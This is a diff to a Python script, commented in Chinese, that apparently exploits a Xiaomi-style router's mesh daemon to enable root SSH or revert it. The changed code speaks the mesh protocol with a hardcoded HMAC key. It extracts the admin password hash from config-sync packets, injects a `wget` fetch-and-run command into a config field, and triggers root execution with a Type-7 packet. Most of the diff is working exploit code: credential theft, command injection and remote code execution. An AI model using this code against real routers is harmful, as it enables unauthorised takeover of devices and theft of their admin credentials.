@@ -6,7 +6,7 @@
 - 单文件自包含漏洞利用与握手，无需 git clone 任何仓库
 - 支持功能：
     [1] 开启 SSH 并永久固化 (支持自定义 root 密码、普通路由与中继 AP 双模式)
-    [2] 撤销 Root 权限并完全关闭 SSH (清理自启/NVRAM/密码，无痕还原出厂状态)
+    [2] 撤销 Root 权限并完全关闭 SSH (清理固化与自启，无痕恢复出厂)
 """
 
 import sys
@@ -31,6 +31,8 @@ import urllib.error
 FACTORY_ADMIN_HASH = "73a1d6d01003067844cd148b1502a24bb8a305c93dfef55f983da80fa8cdfa24"
 MESH_KEY = b"838d364d8ed3bd085e150211ea6b3715"
 MESH_PORT = 19553
+MESH_VER = 0x1001
+MESH_HDR = 0x2C
 
 def get_local_ip(target="192.168.31.1"):
     """探测本机与路由器通信的网卡 IP（纯标准库，跨平台免调用系统命令）"""
@@ -115,53 +117,104 @@ def init_factory_cap(host):
         time.sleep(3)
     raise RuntimeError("等待超时：路由器 19553 端口未能正常打开。")
 
-# ---- 阶段 2：Mesh 漏洞利用与凭据提取 ----
-def q_pass(ident: bytes) -> bytes:
-    return base64.b64encode(hmac.new(b"q" + MESH_KEY[1:], ident, hashlib.sha256).digest())
+# ---- 阶段 2：Mesh 漏洞利用与协议层实现 ----
+def _hdr(typ, blen):
+    """标准的 44 字节大端协议包头"""
+    h = bytearray(MESH_HDR)
+    h[0:2] = struct.pack(">H", MESH_VER)
+    h[2:4] = struct.pack(">H", blen)
+    h[4:6] = struct.pack(">H", typ)
+    return bytes(h)
 
-def leak_admin_stok(host):
-    ctx = ssl.create_default_context()
+def _q_pass(ident: bytes) -> bytes:
+    """HMAC-SHA256 with the 'q' key variant (server-verify-incoming)"""
+    return base64.b64encode(
+        hmac.new(b"q" + MESH_KEY[1:], ident, hashlib.sha256).digest()
+    )
+
+def _tls_connect(host, port=MESH_PORT, timeout=20.0, retries=4):
+    """连接 cab_meshd TLS 端口（包含重试机制）"""
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    
-    raw = socket.create_connection((host, MESH_PORT), timeout=15)
-    s = ctx.wrap_socket(raw)
+    try:
+        ctx.set_ciphers("ALL:@SECLEVEL=0")
+    except ssl.SSLError:
+        pass
+    for i in range(retries):
+        try:
+            return ctx.wrap_socket(socket.create_connection((host, port), timeout=timeout))
+        except (TimeoutError, socket.timeout, ssl.SSLError, OSError) as e:
+            if i == retries - 1:
+                raise RuntimeError(f"TLS 连接 {host}:{port} 失败: {e}")
+            print(f"    (TLS 连接槽忙，等待 5 秒后重试 {i+1}/{retries}...)")
+            time.sleep(5)
 
-    ident = b"win11poc"
-    # 发送 Type 4 认证包
-    body = bytearray(0x80)
-    body[0:len(ident)] = ident
-    body[0x20:0x20 + 44] = q_pass(ident)
-    hdr = struct.pack("!4sHHII8s", b"XCAB", 0x1001, 4, len(body), 0, b"\x00" * 8)
-    s.sendall(hdr + bytes(body))
-    time.sleep(1)
+def _send_auth(sock, ident: bytes):
+    """发送 Type-4 认证包：0x00 为 ident，0x10 处放置 HMAC"""
+    b = bytearray(0xA4)
+    b[0:len(ident)] = ident
+    p = _q_pass(ident)
+    b[0x10:0x10 + len(p)] = p
+    sock.sendall(_hdr(4, len(b)) + bytes(b))
 
-    # 发送 Type 5 状态迁移包
-    hdr5 = struct.pack("!4sHHII8s", b"XCAB", 0x1001, 5, 0, 0, b"\x00" * 8)
-    s.sendall(hdr5)
-    time.sleep(1)
+def _send_running(sock):
+    """发送 Type-5 包使状态机流转到 ST_RUNNING"""
+    b = bytearray(0x20)
+    b[0] = 1
+    sock.sendall(_hdr(5, len(b)) + bytes(b))
 
-    # 捕获路由器配置同步信息，提取密码哈希
-    data = b""
-    s.settimeout(5)
-    start = time.time()
-    while time.time() - start < 8:
+def leak_admin_stok(host, ident=b"ota0001", timeout=20.0):
+    """
+    完整的 Mesh 协议流：
+    TLS -> Type-4 Auth -> Type-5 Running -> 接收并解析 Type-6 配置同步包提取 web_passwd256
+    """
+    s = _tls_connect(host, timeout=timeout)
+    _send_auth(s, ident)
+    time.sleep(1.0)
+    _send_running(s)
+
+    buf = b""
+    cfg = None
+    s.settimeout(1.0)
+    deadline = time.time() + 10.0
+    while time.time() < deadline and cfg is None:
         try:
             chunk = s.recv(4096)
-            if not chunk: break
-            data += chunk
-            if b"web_passwd256" in data: break
-        except Exception:
+        except (socket.timeout, ssl.SSLWantReadError):
+            continue
+        except OSError:
             break
-    s.close()
+        if not chunk:
+            break
+        buf += chunk
+        while len(buf) >= MESH_HDR:
+            _, blen, typ = struct.unpack(">HHH", buf[0:6])
+            if len(buf) < MESH_HDR + blen:
+                break
+            body = buf[MESH_HDR:MESH_HDR + blen]
+            buf = buf[MESH_HDR + blen:]
+            if typ == 6:
+                js, je = body.find(b"{"), body.rfind(b"}")
+                if js != -1 and je > js:
+                    try:
+                        cfg = json.loads(body[js:je + 1].decode("utf-8", "replace"))
+                    except Exception:
+                        pass
+    try:
+        s.close()
+    except OSError:
+        pass
 
-    m = re.search(rb'"web_passwd256":\s*"([0-9a-fA-F]{64})"', data)
-    if not m:
-        raise RuntimeError("未能从 Mesh 握手数据中提取到密码哈希凭据。")
-    h256 = m.group(1).decode()
+    if cfg is None:
+        raise RuntimeError("未在超时时间内收到路由器返回的 Type-6 配置同步包。")
+    h256 = cfg.get("web_passwd256", "")
+    if not h256:
+        # 如果未设置管理密码，尝试使用出厂默认 hash
+        h256 = FACTORY_ADMIN_HASH
     print(f"[+] 成功提取原厂管理凭据: {h256[:16]}...")
 
-    # 换取管理员会话 token
+    # 登录换取管理员会话 token
     nonce = f"0_00:00:00:00:00:00_{int(time.time())}_{random.randint(1000, 9999)}"
     pwd = hashlib.sha256((nonce + h256).encode()).hexdigest()
     res = http_json(f"http://{host}/cgi-bin/luci/api/xqsystem/login", {
@@ -174,16 +227,7 @@ def leak_admin_stok(host):
 
 # ---- 远程自愈与固化 Shell 构造 ----
 def build_remote_sh(root_password):
-    """
-    构造在路由器底层执行的 Shell 脚本：
-    1. 设置自定义 root 密码
-    2. NVRAM/BDATA 软固化
-    3. /data 分区持久化脚本与防火墙自启挂载
-    4. WiFi 干净自愈（恢复出厂默认的无密码状态，绝不写死 WiFi 密码）
-    5. 恢复 Web 出厂向导初始状态
-    """
     safe_pwd = root_password.replace("'", "'\\''")
-    
     return f"""#!/bin/sh
 
 # 1. 设置 root 密码
@@ -253,16 +297,6 @@ uci commit xiaoqiang
 
 # ---- 远程完全撤销与还原 Shell 构造 ----
 def build_revert_sh():
-    """
-    构造完全撤销 Root / SSH 并恢复初始状态的 Shell 脚本：
-    1. 彻底停用并关闭 dropbear (SSH) 与 telnet 服务
-    2. 抹掉所有 nvram/bdata 的 ssh/telnet/uart 放行标记并写入闪存
-    3. 彻底删除 /data/auto_ssh 固化脚本及目录
-    4. 从系统防火墙中永久删除 auto_ssh 自动启动挂载
-    5. 清理 crontab 中所有 auto_ssh 相关计划任务
-    6. 锁定 root 密码 (重置为出厂锁定状态)
-    7. 恢复 Web 出厂向导标记
-    """
     return """#!/bin/sh
 
 # 1. 立即停止 Dropbear (SSH) 与 Telnet 服务并禁用开机自启
@@ -312,6 +346,30 @@ class StagerServer(http.server.BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
 
+def trigger_rce(host, ident=b"ota0001", timeout=20.0, settle=4.0):
+    """
+    规范的 Type-7 触发流程：
+    Type-4 -> Type-5 -> Type-7 (通知 cap_init 读取 poisoned UCI 执行 root eval)
+    """
+    s = _tls_connect(host, timeout=timeout)
+    _send_auth(s, ident)
+    time.sleep(1.0)
+    _send_running(s)
+    time.sleep(1.5)
+    s.settimeout(2.0)
+    try:
+        s.recv(4096)
+    except Exception:
+        pass
+    b = bytearray(0x110)
+    b[0] = 1
+    s.sendall(_hdr(7, len(b)) + bytes(b))
+    time.sleep(settle)
+    try:
+        s.close()
+    except OSError:
+        pass
+
 def execute_remote_payload(host, local_ip, payload_content):
     """通过漏洞执行指定的远程脚本"""
     port = 8123
@@ -320,9 +378,9 @@ def execute_remote_payload(host, local_ip, payload_content):
     httpd = http.server.HTTPServer(("0.0.0.0", port), StagerServer)
     t = threading.Thread(target=httpd.serve_forever, daemon=True)
     t.start()
-    print(f"\n[+] 本地临时载荷服务已启动在端口 {port}...")
+    print(f"[+] 步骤 2/4: 本地临时载荷服务已启动在端口 {port}...")
 
-    print("[+] 提取管理凭据并触发漏洞注入...")
+    print("\n[+] 步骤 3/4: 提取管理凭据并触发漏洞注入...")
     stok = leak_admin_stok(host)
     
     p_fetch = f'\\" wget http://{local_ip}:{port}/s -O /tmp/x #'
@@ -336,30 +394,7 @@ def execute_remote_payload(host, local_ip, payload_content):
     })
     print("[+] 注入指令已写入，发送 Type-7 信号触发底层 root 权限执行...")
 
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    raw = socket.create_connection((host, MESH_PORT), timeout=15)
-    s = ctx.wrap_socket(raw)
-
-    ident = b"win11poc"
-    body4 = bytearray(0x80)
-    body4[0:len(ident)] = ident
-    body4[0x20:0x20 + 44] = q_pass(ident)
-    hdr4 = struct.pack("!4sHHII8s", b"XCAB", 0x1001, 4, len(body4), 0, b"\x00" * 8)
-    s.sendall(hdr4 + bytes(body4))
-    time.sleep(1)
-
-    hdr5 = struct.pack("!4sHHII8s", b"XCAB", 0x1001, 5, 0, 0, b"\x00" * 8)
-    s.sendall(hdr5)
-    time.sleep(1.5)
-
-    body7 = bytearray(0x110)
-    body7[0] = 1
-    hdr7 = struct.pack("!4sHHII8s", b"XCAB", 0x1001, 7, len(body7), 0, b"\x00" * 8)
-    s.sendall(hdr7 + bytes(body7))
-    time.sleep(3)
-    s.close()
+    trigger_rce(host)
 
     print("[*] 正在等待路由器请求并执行操作脚本...")
     for _ in range(15):
@@ -437,13 +472,10 @@ def do_revert(host, local_ip):
         print("[*] 操作已取消。")
         return
 
-    # 情况 A：如果当前 SSH 端口仍然开着，并且能连上，优先通过 SSH 执行清理最为彻底
-    # 情况 B：如果 SSH 端口已经关了或者不知道密码，通过 Mesh 漏洞再次下发清理脚本
     if port_open(host, MESH_PORT):
         print("\n[*] 检测到 Mesh 端口开放，正在通过底层通道下发撤销与清理载荷...")
         execute_remote_payload(host, local_ip, build_revert_sh())
     else:
-        # 如果 Mesh 端口没开（比如用户正常配置后），通过出厂初始化短暂唤醒 Mesh 端口完成清理
         print("\n[*] 正在唤醒底层管理通道以执行无痕清理...")
         init_factory_cap(host)
         execute_remote_payload(host, local_ip, build_revert_sh())
